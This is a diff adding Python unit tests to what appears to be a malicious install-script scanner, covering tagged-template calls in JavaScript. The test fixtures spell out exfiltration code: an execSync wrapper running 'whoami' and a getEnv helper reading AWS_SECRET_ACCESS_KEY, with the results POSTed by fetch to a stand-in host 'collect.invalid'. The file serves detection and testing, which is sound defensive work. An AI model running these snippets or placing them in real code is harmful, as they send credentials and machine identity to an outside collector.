@@ -456,6 +456,39 @@ class InstallTimeTests(unittest.TestCase):
         self.assertNotIn(reason, core.install_script_risk(own))     # an installer's own shortcut
 
 
+class TaggedTemplateWrapperTests(unittest.TestCase):
+    """PANIC-TAGGED (0.1.9, Oct 18): a tagged template call of a script's wrapper of exec or of its getEnv() made the
+    engine panic once the tree held more nodes than list slots (@epoch32/visage 1.14.0's bundle): its readers took the
+    template's slot as the call's argument list. Now the tag's first parameter is the template's strings, read as
+    their text when the template is one piece. Twin of exfiltration.test.js's."""
+
+    PAD = "0;\n" * 3000                     # statements before the call: more nodes than list slots
+    EXEC = ("const { execSync } = require('child_process');\n"
+            "function run(c) { try { return execSync(String(c)).toString(); } catch { return ''; } }\n")
+    ENV = "function getEnv(n) { return process.env[n]; }\n"
+
+    @staticmethod
+    def post(v):
+        return "fetch('https://collect.invalid/c', { method: 'POST', body: %s });\n" % v
+
+    def risk(self, text):
+        return core.install_script_risk(self.PAD + text, lang="js")
+
+    def test_the_template_is_the_command_or_the_name(self):
+        self.assertEqual(self.risk(self.EXEC + self.post("run`whoami`")),
+                         ["sends the machine's user or host name over the network"])
+        self.assertEqual(self.risk(self.ENV + self.post("getEnv`AWS_SECRET_ACCESS_KEY`")),
+                         ["sends environment variables over the network (AWS_SECRET_ACCESS_KEY)"])
+
+    def test_no_constant_text_no_source_and_no_failure(self):
+        self.assertEqual(self.risk(self.EXEC + "const w = 'who';\n" + self.post("run`${w}ami`")), [])
+        self.assertEqual(self.risk(self.ENV + self.post("getEnv`HOST`")), [])
+
+    def test_a_call_as_before(self):
+        self.assertEqual(self.risk(self.EXEC + self.post("run('whoami')")),
+                         ["sends the machine's user or host name over the network"])
+
+
 class FetchFallbackTests(unittest.TestCase):
     """D-21 (0.1.9): the platform's fetch, and a helper's fallback to it from a parameter (`customFetch ?? fetch`,
     inspect-ai's view bundle), were found by name to be any function of the script's called `fetch` too (a class's
